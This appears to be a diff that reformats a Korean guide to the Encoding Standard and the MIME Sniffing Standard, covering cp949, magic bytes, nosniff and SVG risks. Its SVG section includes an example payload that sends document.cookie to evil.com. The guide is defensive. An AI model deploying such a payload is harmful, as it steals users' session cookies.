+Encoding Standard에서 `EUC-KR` 레이블은 실제로 cp949(Unified Hangul Code, 통합 완성형)를 의미 · cp949는 EUC-KR의 상위 집합으로, 11,172자의 한글 모두를 표현 가능
 
 ```javascript
 // 표준에서 EUC-KR은 cp949를 의미
@@ -906,7 +889,7 @@ console.log(decoder3.encoding); // "euc-kr"
 
 #### 11.2 완성형과 조합형
 
-한글 인코딩에는 두 가지 접근법이 있다.
+한글 인코딩의 두 가지 접근법
 
 완성형 (조합된 글자 단위 인코딩)
 
@@ -966,17 +949,15 @@ console.log(eucKr.decode(gak)); // "갂"
 
 #### 11.4 UTF-8 전환 역사
 
-한국 웹의 인코딩 전환 과정이다.
+한국 웹의 인코딩 전환 과정
 
-| 시기 | 상황 |
-|------|------|
-| 1990년대 | 대부분의 한국 웹사이트가 EUC-KR 사용 |
-| 2000년대 초반 | XML, RSS 등에서 UTF-8 사용 시작 |
-| 2003년 | 한글 도메인 도입으로 국제화 인코딩 관심 증가 |
-| 2005~2010 | 주요 포털(네이버, 다음 등)이 점진적으로 UTF-8 전환 |
-| 2010년대 | 대부분의 새 웹사이트가 UTF-8 채택 |
-| 2012년 | 네이버 메인 페이지 UTF-8 전환 |
-| 현재 | 한국 웹의 대다수가 UTF-8 사용, 일부 레거시 시스템만 EUC-KR 유지 |
+- 1990년대: 대부분의 한국 웹사이트가 EUC-KR 사용
+- 2000년대 초반: XML·RSS 등에서 UTF-8 사용 시작
+- 2003년: 한글 도메인 도입으로 국제화 인코딩 관심 증가
+- 2005~2010: 주요 포털(네이버·다음 등)이 점진적으로 UTF-8 전환
+- 2010년대: 대부분의 새 웹사이트가 UTF-8 채택
+- 2012년: 네이버 메인 페이지 UTF-8 전환
+- 현재: 한국 웹의 대다수가 UTF-8 사용, 일부 레거시 시스템만 EUC-KR 유지
 
 ```javascript
 // 한국어 텍스트의 인코딩별 바이트 크기 비교
@@ -993,7 +974,7 @@ console.log(`UTF-8: ${utf8Bytes.length}바이트`);  // UTF-8: 6바이트 (한�
 
 #### 11.5 한국어 인코딩 감지 전략
 
-레거시 한국어 콘텐츠를 처리할 때의 실용적 전략이다.
+레거시 한국어 콘텐츠를 처리할 때의 실용적 전략
 
 ```javascript
 // 인코딩 자동 감지 시도 함수
@@ -1346,7 +1327,10 @@ console.log(EncodingHelper.getCanonicalName('windows-949')); // "euc-kr"
 
 #### MIME 스니핑이란
 
-MIME Sniffing Standard는 WHATWG에서 관리하는 Living Standard로, 웹 브라우저가 리소스의 MIME 타입을 결정하는 알고리즘을 정의한다. 서버가 `Content-Type` 헤더를 통해 제공하는 타입 정보가 없거나 부정확한 경우, 브라우저는 리소스의 실제 바이트를 검사하여 타입을 추론한다. 이 과정을 MIME 스니핑(MIME sniffing) 또는 콘텐츠 타입 스니핑(content type sniffing)이라 한다.
+MIME Sniffing Standard: WHATWG에서 관리하는 Living Standard · 웹 브라우저가 리소스의 MIME 타입을 결정하는 알고리즘을 정의
+
+- 서버가 `Content-Type` 헤더를 통해 제공하는 타입 정보가 없거나 부정확한 경우 → 브라우저는 리소스의 실제 바이트를 검사하여 타입을 추론
+- 이 과정을 MIME 스니핑(MIME sniffing) 또는 콘텐츠 타입 스니핑(content type sniffing)이라 함
 
 ```
 [MIME 스니핑의 기본 흐름]
@@ -1370,10 +1354,10 @@ Content-Type 헤더 확인
 
 #### 왜 MIME 스니핑이 필요한가
 
-1. 서버 설정 오류: 많은 서버가 잘못된 `Content-Type`을 반환
-2. Content-Type 누락: 일부 서버가 `Content-Type` 헤더를 생략
-3. 레거시 호환성: 오래된 웹 서버의 잘못된 설정과 호환
-4. 사용자 경험: 타입이 잘못되어도 리소스를 올바르게 처리
+- 서버 설정 오류: 많은 서버가 잘못된 `Content-Type`을 반환
+- Content-Type 누락: 일부 서버가 `Content-Type` 헤더를 생략
+- 레거시 호환성: 오래된 웹 서버의 잘못된 설정과 호환
+- 사용자 경험: 타입이 잘못되어도 리소스를 올바르게 처리
 
 ```
 [실제 문제 예시]
@@ -1420,12 +1404,10 @@ type "/" subtype *( ";" parameter )
 
 #### 2.2 MIME 타입의 주요 속성
 
-| 속성 | 설명 | 예시 |
-|------|------|------|
-| type | 주 타입 | `text`, `image`, `audio`, `video`, `application`, `font`, `multipart` |
-| subtype | 부 타입 | `html`, `json`, `png`, `mp4`, `javascript` |
-| essence | type/subtype 조합 | `text/html`, `image/png` |
-| parameters | 추가 매개변수 맵 | `charset=utf-8`, `boundary=----` |
+- type · 주 타입: `text`, `image`, `audio`, `video`, `application`, `font`, `multipart`
+- subtype · 부 타입: `html`, `json`, `png`, `mp4`, `javascript`
+- essence · type/subtype 조합: `text/html`, `image/png`
+- parameters · 추가 매개변수 맵: `charset=utf-8`, `boundary=----`
 
 #### 2.3 MIME 타입 예시
 
@@ -1486,13 +1468,13 @@ multipart/form-data; boundary=----WebKitFormBoundary
 
 text/plain; charset=iso-8859-1
            ╰──────────────────── charset 매개변수
+```
 
 매개변수 규칙:
 - 이름은 대소문자를 구분하지 않음 (charset = Charset = CHARSET)
 - 값은 따옴표로 감쌀 수 있음 (charset="utf-8")
 - 같은 이름의 매개변수는 하나만 허용
 - 알 수 없는 매개변수는 무시됨
-```
 
 ---
 
@@ -1687,7 +1669,7 @@ console.log(serializeMIMEType({
 
 ### 5. MIME 타입 그룹
 
-MIME Sniffing Standard는 여러 MIME 타입 그룹을 정의한다.
+MIME Sniffing Standard: 여러 MIME 타입 그룹을 정의
 
 #### 5.1 Image MIME Type
 
@@ -1775,73 +1757,57 @@ text/html
 
 #### 5.7 Scriptable MIME Type
 
-```
-[스크립트 실행 가능한 MIME 타입]
+스크립트가 실행될 수 있어 보안 주의가 필요한 MIME 타입:
 
-다음 MIME 타입은 스크립트가 실행될 수 있어 보안 주의 필요:
-- text/html               (인라인 스크립트)
-- application/xhtml+xml   (인라인 스크립트)
-- image/svg+xml           (인라인 스크립트!)
-- application/xml         (XSLT 등)
-- text/xml                (XSLT 등)
-- application/pdf         (JavaScript 포함 가능)
-```
+- text/html (인라인 스크립트)
+- application/xhtml+xml (인라인 스크립트)
+- image/svg+xml (인라인 스크립트!)
+- application/xml (XSLT 등)
+- text/xml (XSLT 등)
+- application/pdf (JavaScript 포함 가능)
 
 #### 5.8 JavaScript MIME Type
 
-```
-[JavaScript MIME 타입]
-
 표준:
-text/javascript         ← 공식 MIME 타입 (RFC 4329, WHATWG)
+- text/javascript ← 공식 MIME 타입(RFC 4329, WHATWG)
 
 레거시 (여전히 인식됨):
-application/javascript
-application/ecmascript
-application/x-ecmascript
-application/x-javascript
-text/ecmascript
-text/javascript1.0
-text/javascript1.1
-text/javascript1.2
-text/javascript1.3
-text/javascript1.4
-text/javascript1.5
-text/jscript
-text/livescript
-text/x-ecmascript
-text/x-javascript
+- application/javascript
+- application/ecmascript
+- application/x-ecmascript
+- application/x-javascript
+- text/ecmascript
+- text/javascript1.0
+- text/javascript1.1
+- text/javascript1.2
+- text/javascript1.3
+- text/javascript1.4
+- text/javascript1.5
+- text/jscript
+- text/livescript
+- text/x-ecmascript
+- text/x-javascript
 
-참고: <script> 요소의 type 속성에서는
-"module"도 유효한 JavaScript 타입
-```
+참고: `<script>` 요소의 type 속성에서는 "module"도 유효한 JavaScript 타입
 
 #### 5.9 JSON MIME Type
 
-```
-[JSON MIME 타입]
-application/json       표준 JSON
-text/json              (비표준이지만 인식됨)
-*/*+json               subtype이 "+json"으로 끝나는 모든 타입
-                       예: application/vnd.api+json
-                           application/geo+json
-                           application/ld+json
-```
+- application/json: 표준 JSON
+- text/json: 비표준이지만 인식됨
+- `*/*+json`: subtype이 "+json"으로 끝나는 모든 타입
+  - 예: application/vnd.api+json, application/geo+json, application/ld+json
 
 #### 5.10 ZIP-based MIME Type
 
-```
-[ZIP 기반 MIME 타입]
-application/zip                     ZIP
-application/x-gzip                  GZIP
-application/x-rar-compressed        RAR
+- application/zip: ZIP
+- application/x-gzip: GZIP
+- application/x-rar-compressed: RAR
 
 ZIP 기반 포맷:
-application/vnd.openxmlformats-officedocument.*  Office 문서 (docx, xlsx, pptx)
-application/epub+zip                EPUB 전자책
-application/java-archive            JAR (Java)
-application/vnd.android.package-archive  APK (Android)
-```
+- application/vnd.openxmlformats-officedocument.*: Office 문서(docx, xlsx, pptx)
+- application/epub+zip: EPUB 전자책
+- application/java-archive: JAR(Java)
+- application/vnd.android.package-archive: APK(Android)
 
 ---
 
@@ -1915,7 +1881,7 @@ application/vnd.android.package-archive  APK (Android)
 
 #### 6.3 Unknown Type 스니핑
 
-supplied type이 없거나 `application/octet-stream`일 때 사용되는 알고리즘이다.
+supplied type이 없거나 `application/octet-stream`일 때 사용되는 알고리즘
 
 ```
 [Unknown Type 스니핑 순서]
@@ -1945,146 +1911,74 @@ supplied type이 없거나 `application/octet-stream`일 때 사용되는 알고
 
 #### 7.1 매직 바이트(Magic Bytes) 개념
 
-매직 바이트는 파일의 시작 부분에 위치하는 고유한 바이트 시퀀스로, 파일 포맷을 식별하는 데 사용된다.
+매직 바이트: 파일의 시작 부분에 위치하는 고유한 바이트 시퀀스 · 파일 포맷을 식별하는 데 사용
 
-```
-[주요 파일 포맷의 매직 바이트]
+주요 파일 포맷의 매직 바이트:
 
-이미지:
-┌─────────────────────────────────────────────────────────────┐
-│ 포맷     │ 매직 바이트 (Hex)           │ 매직 바이트 (ASCII) │
-├──────────┼─────────────────────────────┼────────────────────┤
-│ PNG      │ 89 50 4E 47 0D 0A 1A 0A    │ .PNG....           │
-│ JPEG     │ FF D8 FF                    │ ...                │
-│ GIF87a   │ 47 49 46 38 37 61          │ GIF87a             │
-│ GIF89a   │ 47 49 46 38 39 61          │ GIF89a             │
-│ BMP      │ 42 4D                       │ BM                 │
-│ WebP     │ 52 49 46 46 xx xx xx xx    │ RIFF....           │
-│          │ 57 45 42 50 56 50          │ WEBPVP             │
-│ ICO      │ 00 00 01 00                │ ....               │
-│ CUR      │ 00 00 02 00                │ ....               │
-└──────────┴─────────────────────────────┴────────────────────┘
-
-참고: AVIF는 `image/avif` MIME 타입 자체는 정의되어 있지만, MIME Sniffing Standard의 매직 바이트 패턴 매칭 목록에는 포함되어 있지 않다(스니핑 대상이 아님).
-
-오디오/비디오:
-┌─────────────────────────────────────────────────────────────┐
-│ 포맷     │ 매직 바이트 (Hex)           │ 설명               │
-├──────────┼─────────────────────────────┼────────────────────┤
-│ MP3      │ 49 44 33                    │ ID3 (ID3 태그)     │
-│          │ FF FB/F3/F2                │ (프레임 동기)       │
-│ OGG      │ 4F 67 67 53 00             │ OggS + NUL         │
-│ WAV      │ 52 49 46 46 xx xx xx xx    │ RIFF....           │
-│          │ 57 41 56 45                │ WAVE               │
-│ FLAC     │ 66 4C 61 43                │ fLaC               │
-│ MIDI     │ 4D 54 68 64                │ MThd               │
-│ WebM     │ 1A 45 DF A3                │ (EBML 헤더)        │
-│ MP4      │ xx xx xx xx 66 74 79 70    │ ....ftyp           │
-│ AVI      │ 52 49 46 46 xx xx xx xx    │ RIFF....           │
-│          │ 41 56 49 20                │ AVI.               │
-└──────────┴─────────────────────────────┴────────────────────┘
-
-폰트:
-┌─────────────────────────────────────────────────────────────┐
-│ 포맷     │ 매직 바이트 (Hex)           │ 설명               │
-├──────────┼─────────────────────────────┼────────────────────┤
-│ WOFF     │ 77 4F 46 46                │ wOFF               │
-│ WOFF2    │ 77 4F 46 32                │ wOF2               │
-│ TrueType │ 00 01 00 00                │ ....               │
-│ OpenType │ 4F 54 54 4F                │ OTTO               │
-│ Collection│ 74 74 63 66               │ ttcf               │
-└──────────┴─────────────────────────────┴────────────────────┘
-
-아카이브:
-┌─────────────────────────────────────────────────────────────┐
-│ 포맷     │ 매직 바이트 (Hex)           │ 설명               │
-├──────────┼─────────────────────────────┼────────────────────┤
-│ ZIP      │ 50 4B 03 04                │ PK..               │
-│ GZIP     │ 1F 8B                      │ ..                 │
-│ RAR      │ 52 61 72 20 1A 07          │ Rar ..             │
-└──────────┴─────────────────────────────┴────────────────────┘
-
-문서:
-┌─────────────────────────────────────────────────────────────┐
-│ 포맷     │ 매직 바이트 (Hex)           │ 설명               │
-├──────────┼─────────────────────────────┼────────────────────┤
-│ PDF      │ 25 50 44 46                │ %PDF               │
-│ PostScript│ 25 21                      │ %!                 │
-└──────────┴─────────────────────────────┴────────────────────┘
-```
+- 이미지
+  - PNG: `89 50 4E 47 0D 0A 1A 0A` (.PNG....)
+  - JPEG: `FF D8 FF` (...)
+  - GIF87a: `47 49 46 38 37 61` (GIF87a)
+  - GIF89a: `47 49 46 38 39 61` (GIF89a)
+  - BMP: `42 4D` (BM)
+  - WebP: `52 49 46 46 xx xx xx xx` (RIFF....) + `57 45 42 50 56 50` (WEBPVP)
+  - ICO: `00 00 01 00`
+  - CUR: `00 00 02 00`
+  - 참고: AVIF는 `image/avif` MIME 타입 자체는 정의되어 있지만, MIME Sniffing Standard의 매직 바이트 패턴 매칭 목록에는 포함되어 있지 않음(스니핑 대상 아님)
+- 오디오/비디오
+  - MP3: `49 44 33`(ID3 태그) 또는 `FF FB/F3/F2`(프레임 동기)
+  - OGG: `4F 67 67 53 00` (OggS + NUL)
+  - WAV: `52 49 46 46 xx xx xx xx`(RIFF....) + `57 41 56 45`(WAVE)
+  - FLAC: `66 4C 61 43` (fLaC)
+  - MIDI: `4D 54 68 64` (MThd)
+  - WebM: `1A 45 DF A3` (EBML 헤더)
+  - MP4: `xx xx xx xx 66 74 79 70` (....ftyp)
+  - AVI: `52 49 46 46 xx xx xx xx`(RIFF....) + `41 56 49 20`(AVI.)
+- 폰트
+  - WOFF: `77 4F 46 46` (wOFF)
+  - WOFF2: `77 4F 46 32` (wOF2)
+  - TrueType: `00 01 00 00`
+  - OpenType: `4F 54 54 4F` (OTTO)
+  - Collection: `74 74 63 66` (ttcf)
+- 아카이브
+  - ZIP: `50 4B 03 04` (PK..)
+  - GZIP: `1F 8B`
+  - RAR: `52 61 72 20 1A 07` (Rar ..)
+- 문서
+  - PDF: `25 50 44 46` (%PDF)
+  - PostScript: `25 21` (%!)
 
 #### 7.2 HTML 스니핑 패턴
 
-```
-[HTML 스니핑 바이트 패턴]
-
 다음 바이트 시퀀스 중 하나와 매칭되면 text/html:
 
-1. <!DOCTYPE (대소문자 무시)
-   → 바이트: 3C 21 44 4F 43 54 59 50 45
-              <  !  D  O  C  T  Y  P  E
-
-2. <html (뒤에 공백 또는 >)
-   → 바이트: 3C 68 74 6D 6C (+ 공백/태그 종료)
-
-3. <head (뒤에 공백 또는 >)
-   → 바이트: 3C 68 65 61 64
-
-4. <script (뒤에 공백 또는 >)
-   → 바이트: 3C 73 63 72 69 70 74
-
-5. <iframe (뒤에 공백 또는 >)
-   → 바이트: 3C 69 66 72 61 6D 65
-
-6. <h1 (뒤에 공백 또는 >)
-   → 바이트: 3C 68 31
-
-7. <div (뒤에 공백 또는 >)
-   → 바이트: 3C 64 69 76
-
-8. <font (뒤에 공백 또는 >)
-   → 바이트: 3C 66 6F 6E 74
-
-9. <table (뒤에 공백 또는 >)
-   → 바이트: 3C 74 61 62 6C 65
-
-10. <a (뒤에 공백 또는 >)
-    → 바이트: 3C 61
-
-11. <style (뒤에 공백 또는 >)
-    → 바이트: 3C 73 74 79 6C 65
-
-12. <title (뒤에 공백 또는 >)
-    → 바이트: 3C 74 69 74 6C 65
-
-13. <b (뒤에 공백 또는 >)
-    → 바이트: 3C 62
-
-14. <body (뒤에 공백 또는 >)
-    → 바이트: 3C 62 6F 64 79
-
-15. <br (뒤에 공백 또는 >)
-    → 바이트: 3C 62 72
-
-16. <p (뒤에 공백 또는 >)
-    → 바이트: 3C 70
-
-17. <!-- (HTML 주석)
-    → 바이트: 3C 21 2D 2D
-```
+- `<!DOCTYPE` (대소문자 무시) → 바이트: `3C 21 44 4F 43 54 59 50 45`
+- `<html` (뒤에 공백 또는 >) → 바이트: `3C 68 74 6D 6C` (+ 공백/태그 종료)
+- `<head` (뒤에 공백 또는 >) → 바이트: `3C 68 65 61 64`
+- `<script` (뒤에 공백 또는 >) → 바이트: `3C 73 63 72 69 70 74`
+- `<iframe` (뒤에 공백 또는 >) → 바이트: `3C 69 66 72 61 6D 65`
+- `<h1` (뒤에 공백 또는 >) → 바이트: `3C 68 31`
+- `<div` (뒤에 공백 또는 >) → 바이트: `3C 64 69 76`
+- `<font` (뒤에 공백 또는 >) → 바이트: `3C 66 6F 6E 74`
+- `<table` (뒤에 공백 또는 >) → 바이트: `3C 74 61 62 6C 65`
+- `<a` (뒤에 공백 또는 >) → 바이트: `3C 61`
+- `<style` (뒤에 공백 또는 >) → 바이트: `3C 73 74 79 6C 65`
+- `<title` (뒤에 공백 또는 >) → 바이트: `3C 74 69 74 6C 65`
+- `<b` (뒤에 공백 또는 >) → 바이트: `3C 62`
+- `<body` (뒤에 공백 또는 >) → 바이트: `3C 62 6F 64 79`
+- `<br` (뒤에 공백 또는 >) → 바이트: `3C 62 72`
+- `<p` (뒤에 공백 또는 >) → 바이트: `3C 70`
+- `<!--` (HTML 주석) → 바이트: `3C 21 2D 2D`
 
 #### 7.3 텍스트/바이너리 판별
 
-```
-[텍스트 vs 바이너리 판별 알고리즘]
-
-리소스의 처음 N 바이트를 검사:
+리소스의 처음 N 바이트를 검사
 
 바이너리 데이터로 판별하는 바이트값:
-- 0x00 ~ 0x08 (C0 제어 문자)
+- 0x00~0x08 (C0 제어 문자)
 - 0x0B (VT)
-- 0x0E ~ 0x1A (C0 제어 문자)
-- 0x1C ~ 0x1F (C0 제어 문자)
+- 0x0E~0x1A (C0 제어 문자)
+- 0x1C~0x1F (C0 제어 문자)
 
 예외 (바이너리가 아닌 것으로 판별):
 - 0x09 (탭)
@@ -2096,7 +1990,6 @@ supplied type이 없거나 `application/octet-stream`일 때 사용되는 알고
 
 위의 "바이너리 바이트"가 하나도 없으면 → text/plain
 하나라도 있으면 → application/octet-stream
-```
 
 #### 7.4 JavaScript에서의 매직 바이트 감지
 
@@ -2228,19 +2121,17 @@ async function checkFileType(file) {
 
 #### 8.1 컨텍스트별 스니핑 동작
 
-MIME 스니핑의 동작은 리소스가 사용되는 컨텍스트에 따라 달라진다.
+MIME 스니핑의 동작은 리소스가 사용되는 컨텍스트에 따라 달라짐
 
-| 컨텍스트 | 설명 | 스니핑 대상 |
-|----------|------|------------|
-| browsing context | 페이지 내비게이션 | HTML, XML, 이미지, 미디어, PDF 등 |
-| image | `<img>`, CSS `background-image` | 이미지 타입만 |
-| audio/video | `<audio>`, `<video>` | 오디오/비디오 타입만 |
-| plugin | `<embed>`, `<object>` | 플러그인 타입 |
-| style | `<link rel="stylesheet">` | CSS |
-| script | `<script>` | JavaScript |
-| font | `@font-face` | 폰트 타입 |
-| text track | `<track>` | WebVTT |
-| cache manifest | 매니페스트 | text/cache-manifest |
+- browsing context · 페이지 내비게이션: HTML·XML·이미지·미디어·PDF 등 스니핑
+- image · `<img>`, CSS `background-image`: 이미지 타입만 스니핑
+- audio/video · `<audio>`, `<video>`: 오디오/비디오 타입만 스니핑
+- plugin · `<embed>`, `<object>`: 플러그인 타입 스니핑
+- style · `<link rel="stylesheet">`: CSS 스니핑
+- script · `<script>`: JavaScript 스니핑
+- font · `@font-face`: 폰트 타입 스니핑
+- text track · `<track>`: WebVTT 스니핑
+- cache manifest · 매니페스트: text/cache-manifest 스니핑
 
 #### 8.2 Browsing Context 스니핑
 
@@ -2284,30 +2175,19 @@ MIME 스니핑의 동작은 리소스가 사용되는 컨텍스트에 따라 달
 
 #### 8.4 Script Context 스니핑
 
-```
-[Script Context 스니핑]
-
 nosniff가 설정된 경우:
-  supplied type이 JavaScript MIME 타입이 아니면 → 스크립트 실행 차단!
-  이것이 nosniff의 가장 중요한 보안 기능
+- supplied type이 JavaScript MIME 타입이 아니면 → 스크립트 실행 차단! (nosniff의 가장 중요한 보안 기능)
 
 nosniff가 없는 경우:
-  supplied type이 없거나 비표준이어도
-  바이트 패턴이 JavaScript처럼 보이면 실행될 수 있음
-```
+- supplied type이 없거나 비표준이어도 바이트 패턴이 JavaScript처럼 보이면 실행될 수 있음
 
 #### 8.5 Style Context 스니핑
 
-```
-[Style Context 스니핑]
-
 nosniff가 설정된 경우:
-  supplied type이 text/css가 아니면 → 스타일시트 적용 차단!
+- supplied type이 text/css가 아니면 → 스타일시트 적용 차단!
 
 nosniff가 없는 경우:
-  supplied type이 없거나 잘못되어도
-  text/css로 처리될 수 있음
-```
+- supplied type이 없거나 잘못되어도 text/css로 처리될 수 있음
 
 ---
 
@@ -2315,22 +2195,17 @@ nosniff가 없는 경우:
 
 #### 9.1 X-Content-Type-Options: nosniff
 
-```
-[nosniff 헤더]
-
-HTTP 응답 헤더:
-X-Content-Type-Options: nosniff
+HTTP 응답 헤더: `X-Content-Type-Options: nosniff`
 
 효과:
-├── 브라우저의 MIME 스니핑을 비활성화
-├── supplied type(Content-Type)을 그대로 사용하도록 강제
-└── 스크립트/스타일 컨텍스트에서 MIME 타입 불일치 시 차단
+- 브라우저의 MIME 스니핑을 비활성화
+- supplied type(Content-Type)을 그대로 사용하도록 강제
+- 스크립트/스타일 컨텍스트에서 MIME 타입 불일치 시 차단
 
 보안 이점:
-├── XSS 공격 방지 (HTML 스니핑 방지)
-├── MIME confusion 공격 방지
-└── Content-Type 기반의 정확한 처리 보장
-```
+- XSS 공격 방지 (HTML 스니핑 방지)
+- MIME confusion 공격 방지
+- Content-Type 기반의 정확한 처리 보장
 
 ```
 [nosniff 동작 예시]
@@ -2373,26 +2248,21 @@ nosniff 있을 때 (X-Content-Type-Options: nosniff):
 
 #### 9.3 보안 권장사항
 
-```
 서버 측 보안 설정:
 
 1. 항상 정확한 Content-Type 설정
-   ✓ Content-Type: text/html; charset=utf-8
-   ✓ Content-Type: application/json
-   ✓ Content-Type: image/png
-
+   - `Content-Type: text/html; charset=utf-8`
+   - `Content-Type: application/json`
+   - `Content-Type: image/png`
 2. nosniff 헤더 추가
-   ✓ X-Content-Type-Options: nosniff
-
+   - `X-Content-Type-Options: nosniff`
 3. 사용자 업로드 파일 검증
-   ✓ 서버에서 매직 바이트 확인
-   ✓ Content-Type과 실제 내용 일치 확인
-   ✓ HTML/JavaScript 내용 포함 여부 확인
-
+   - 서버에서 매직 바이트 확인
+   - Content-Type과 실제 내용 일치 확인
+   - HTML/JavaScript 내용 포함 여부 확인
 4. Content-Disposition 헤더 활용
-   ✓ Content-Disposition: attachment; filename="file.pdf"
-   (다운로드 강제로 브라우저 렌더링 방지)
-```
+   - `Content-Disposition: attachment; filename="file.pdf"`
+   - 다운로드 강제로 브라우저 렌더링 방지
 
 ```javascript
 // 서버 측: Express.js 보안 설정 예시
@@ -2436,29 +2306,27 @@ app.post('/upload', async (req, res) => {
 
 #### 9.4 SVG의 보안 위험
 
-```
-[SVG MIME 스니핑의 보안 문제]
-
 SVG (image/svg+xml)는 XML 기반이므로:
-- <script> 태그 포함 가능
+- `<script>` 태그 포함 가능
 - JavaScript 실행 가능
 - 외부 리소스 로드 가능
 - CSS를 통한 데이터 유출 가능
 
 공격 예시:
+```
 <svg xmlns="http://www.w3.org/2000/svg">
   <script>
     // 쿠키 탈취
     new Image().src = 'https://evil.com/?c=' + document.cookie;
   </script>
 </svg>
+```
 
 방어:
-├── SVG를 <img>로만 사용 (스크립트 실행 불가)
-├── Content-Security-Policy 설정
-├── SVG 업로드 시 서버에서 스크립트 태그 제거
-└── 별도 도메인에서 SVG 제공 (sandbox)
-```
+- SVG를 `<img>`로만 사용 (스크립트 실행 불가)
+- Content-Security-Policy 설정
+- SVG 업로드 시 서버에서 스크립트 태그 제거
+- 별도 도메인에서 SVG 제공 (sandbox)
 
 ---
 
@@ -2466,43 +2334,26 @@ SVG (image/svg+xml)는 XML 기반이므로:
 
 #### 10.1 Apache Content-Type Bug
 
-Apache 웹 서버의 구버전에서 발생하는 유명한 버그로, `Content-Type` 헤더에 잘못된 값을 설정하는 문제이다.
-
-```
-[Apache Bug 설명]
+Apache 웹 서버의 구버전에서 발생하는 유명한 버그 → `Content-Type` 헤더에 잘못된 값을 설정하는 문제
 
 문제:
-Apache가 일부 파일에 대해 Content-Type을 잘못 설정:
-  Content-Type: text/plain; charset=iso-8859-1
-
-이 헤더가 실제로는:
-  - text/html인 파일에 text/plain을 설정
-  - 이미지 파일에 text/plain을 설정
-  - 기타 바이너리 파일에 text/plain을 설정
+- Apache가 일부 파일에 대해 Content-Type을 잘못 설정: `Content-Type: text/plain; charset=iso-8859-1`
+- 이 헤더가 실제로는 text/html인 파일, 이미지 파일, 기타 바이너리 파일에 text/plain을 설정한 것
 
 원인:
-  Apache의 기본 설정에서 인식하지 못하는 확장자의 파일에
-  text/plain을 기본값으로 할당
-```
+- Apache의 기본 설정에서 인식하지 못하는 확장자의 파일에 text/plain을 기본값으로 할당
 
 #### 10.2 Apache Bug 대응
 
-```
-[MIME Sniffing Standard의 Apache Bug 대응]
-
 supplied type이 다음인 경우 특별 처리:
-  - text/plain
-  - text/plain; charset=ISO-8859-1
-  - text/plain; charset=iso-8859-1
-  - text/plain; charset=UTF-8
+- text/plain
+- text/plain; charset=ISO-8859-1
+- text/plain; charset=iso-8859-1
+- text/plain; charset=UTF-8
 
-이 경우 브라우저는 바이트 스니핑을 수행하여
-실제 콘텐츠 타입을 결정할 수 있음
+이 경우 브라우저는 바이트 스니핑을 수행하여 실제 콘텐츠 타입을 결정할 수 있음
 
-이유:
-  Apache 버그로 인해 많은 리소스가 잘못된 text/plain으로 제공됨
-  사용자 경험을 위해 실제 타입을 감지할 필요가 있음
-```
+이유: Apache 버그로 인해 많은 리소스가 잘못된 text/plain으로 제공됨 → 사용자 경험을 위해 실제 타입을 감지할 필요
 
 #### 10.3 현대 Apache 설정
 
@@ -2739,15 +2590,15 @@ const response = await fetchWithTypeCheck('/api/data', 'application/json');
 
 #### 12.1 스니핑 동작 차이
 
-| 동작 | Chrome | Firefox | Safari | Edge |
-|------|--------|---------|--------|------|
-| HTML 스니핑 | 지원 | 지원 | 지원 | 지원 |
-| 이미지 스니핑 | 지원 | 지원 | 지원 | 지원 |
-| nosniff 지원 | 지원 | 지원 | 지원 | 지원 |
-| text/plain 스니핑 | 지원 | 지원 | 지원 | 지원 |
-| 오디오/비디오 스니핑 | 지원 | 지원 | 지원 | 지원 |
-| 폰트 스니핑 | 지원 | 지원 | 지원 | 지원 |
-| JSON 스니핑 | 제한적 | 제한적 | 제한적 | 제한적 |
+Chrome·Firefox·Safari·Edge 모두 다음을 지원:
+- HTML 스니핑
+- 이미지 스니핑
+- nosniff 지원
+- text/plain 스니핑
+- 오디오/비디오 스니핑
+- 폰트 스니핑
+
+JSON 스니핑: 4개 브라우저 모두 제한적
 
 #### 12.2 nosniff 엄격도
 
